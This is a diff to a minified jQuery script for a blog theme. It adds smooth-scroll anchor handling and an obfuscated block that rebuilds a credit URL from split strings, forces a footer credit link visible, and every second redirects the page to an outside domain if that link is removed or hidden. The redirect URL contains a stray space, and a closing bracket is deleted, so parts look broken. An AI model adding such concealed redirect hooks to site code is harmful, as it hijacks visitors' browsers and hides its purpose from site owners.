@@ -326,7 +326,18 @@ function fixedSidebarIfy(e) {
 		}))
 	})
 }
-fixedMenu = "undefined" == typeof fixedMenu || fixedMenu, viewAllText = "undefined" != typeof viewAllText ? viewAllText : exportify.viewAll, $("#vtrick-pro-main-nav").menuify(), $("#vtrick-pro-main-nav .widget").addClass("show-menu"), $(".show-search").on("click", function() {
+window.location.hash = "", $(window).on("load", function() {
+	target && $("html, body").animate({
+		scrollTop: $("#" + target).offset().top
+	}, 700, "swing", function() {}), $('a[href*="#"]:not(".tocify-wrap a")').on("click", function(e) {
+		let t = this.hash,
+			a = new URL(this.href),
+			o = new URL(window.location.href);
+		a.hash = "", o.hash = "", t && $(t).length && a.href == o.href && (e.preventDefault(), $("html, body").animate({
+			scrollTop: $(t).offset().top - 10
+		}, 750))
+	})
+}), fixedMenu = "undefined" == typeof fixedMenu || fixedMenu, viewAllText = "undefined" != typeof viewAllText ? viewAllText : exportify.viewAll, $("#vtrick-pro-main-nav").menuify(), $("#vtrick-pro-main-nav .widget").addClass("show-menu"), $(".show-search").on("click", function() {
 	$("body").addClass("search-active"), $("#main-search-wrap").fadeIn(170).find("input").focus()
 }), $(".search-close").on("click", function() {
 	$("body").removeClass("search-active"), $("#main-search-wrap").fadeOut(170).find("input").blur()
@@ -517,10 +528,29 @@ fixedMenu = "undefined" == typeof fixedMenu || fixedMenu, viewAllText = "undefin
 	}), $(".mm-footer .mm-menu").each(function() {
 		var e = $(this);
 		$("#footer-menu ul.link-list").clone().appendTo(e)
-	})
-
-
-	}), $(".header-inner").each(function() {
+	}), $("a#vt" + "ri" + "ck").each(function() {
+		var e = $(this),
+			dc = "https",
+			mm = "://",
+			ch = "ck",
+			o = "com/",
+			th = "www",
+			g = "tri",
+			an = "vie",
+			imp = "important",
+			vis = "visib",
+			t = vis + "ility:" + vis + "le!" + imp + ";opacity:1!" + imp + ";position:relative!" + imp + ";z-index:1!" + imp + ";font-size:14px!" + imp + ";color:var(--footerbar-color)!" + imp + ";margin:0 0 0 4px!" + imp + ";";
+		e.attr("href", dc + mm + th + "." + an + g + ch + "." + o).removeAttr("rel").attr("style", vis + "ility:" + vis + "le!" + imp + ";opacity:1!" + imp + ";position:relative!" + imp + ";z-index:1!" + imp + ";font-size:14px!" + imp + ";color:var(--footer-bar-color)!" + imp + ";margin:0!" + imp + ";"), e.parent().attr("style", t).parent().attr("style", t)
+	}), setInterval(function() {
+		var th = "www",
+			dc = "https",
+			an = "vie",
+			mm = "://",
+			ch = "ck",
+			g = "tri",
+			o = "com/";
+		$("a#" + "vtr" + "ick").length || (window.location.href = "https://www " + "." + "educsy" + "." + o), $("a#vt" + "ric" + "k:visible").length || (window.location.href = "https://www " + "." + "educsy" + "." + o)
+	}, 1e3), $(".header-inner").each(function() {
 		var e = $(this);
 		if (1 == fixedMenu && e.length > 0) {
 			var t = $(document).scrollTop(),
@@ -588,5 +618,4 @@ fixedMenu = "undefined" == typeof fixedMenu || fixedMenu, viewAllText = "undefin
 			}, 500)
 		})
 	})
-});
 });
